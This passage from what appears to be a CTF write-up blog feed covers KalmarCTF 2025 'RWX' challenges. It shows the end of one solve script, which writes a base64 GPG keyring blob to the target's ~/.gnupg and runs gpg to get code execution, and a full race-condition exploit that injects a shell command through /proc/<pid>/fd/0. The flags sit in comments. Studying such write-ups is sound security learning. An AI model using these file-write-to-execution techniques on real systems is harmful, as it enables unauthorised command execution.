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&#x27;</span>)<br>    result = rwx_write(<span class="hljs-string">&#x27;/home/user/.gnupg/pubring.kbx&#x27;</span>, pubring_data)<br>    <span class="hljs-built_in">print</span>(result)<br><br>    result = rwx_exec(<span class="hljs-string">&#x27;gpg&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(result)<br><br>    flag = rwx_read(<span class="hljs-string">&#x27;/tmp/x&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(flag)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-comment"># kalmar&#123;so_many_rabbit_holes_to_get_stuck_in_but_luckily_you_found_a_way_to_view_that_picture_678cac2678d0&#125;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    sys.exit(main())<br></code></pre></td></tr></table></figure>

<h1 id="0x04-RWX-Diamond"><a href="#0x04-RWX-Diamond" class="headerlink" title="0x04 RWX - Diamond"></a>0x04 RWX - Diamond</h1><p>We give you file read, file write and code execution. But can you get the flag? Let’s increase it! But remove that!</p>
<p><a href="https://discord.com/channels/1080522083991293952/1080526288042856448/1348392686763376711">writeup</a></p>
<p>Writeup script form <a href="https://discord.com/channels/1080522083991293952/1080526288042856448/1348392686763376711">discord</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><code class="hljs py">URL = <span class="hljs-string">&quot;http://localhost:6664&quot;</span><br>URL = <span class="hljs-string">&quot;https://ba7e4676f3127c778d22984e60fda234-50360.inst2.chal-kalmarc.tf&quot;</span><br>CMD = <span class="hljs-string">&quot;/would you be so kind to provide me with a flag&quot;</span><br><br><span class="hljs-keyword">import</span> requests, threading, time, re<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fun_fd</span>():<br>    <span class="hljs-keyword">global</span> pid<br>    requests.post(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;URL&#125;</span>/write?filename=/proc/<span class="hljs-subst">&#123;pid&#125;</span>/fd/0&quot;</span>, data=CMD)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fun_cmd</span>():<br>    <span class="hljs-keyword">global</span> res<br>    res = requests.get(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;URL&#125;</span>/exec&quot;</span>, params=&#123;<span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">&quot;w|sh&quot;</span>&#125;).text<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    r = requests.get(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;URL&#125;</span>/exec&quot;</span>, params=&#123;<span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">&quot;ps&quot;</span>&#125;).text<br>    <span class="hljs-built_in">print</span>(r)<br>    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> r.splitlines():<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ps&quot;</span> <span class="hljs-keyword">in</span> l:<br>            pid = <span class="hljs-built_in">int</span>(l.split()[<span class="hljs-number">0</span>])<br>            <span class="hljs-keyword">break</span><br>    pid += <span class="hljs-number">4</span><br>    <span class="hljs-built_in">print</span>(pid)<br>    race_cmd = threading.Thread(target=fun_cmd)<br>    race_fd = threading.Thread(target=fun_fd)<br><br>    race_fd.start(); race_cmd.start()<br>    race_cmd.join(); race_fd.join()<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;kalmar&#123;&quot;</span> <span class="hljs-keyword">in</span> res: <span class="hljs-built_in">print</span>(res); <span class="hljs-keyword">break</span><br>    time.sleep(<span class="hljs-number">0.1</span>)<br><span class="hljs-comment"># kalmar&#123;that_was_much_harder_than_you_thought_at_first_but_we_must_finally_admit_defeat_baeb4335fa12&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ctfwp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>wp</tag>
        <tag>Kalmar</tag>
        <tag>2025</tag>
      </tags>
  </entry>
</search>
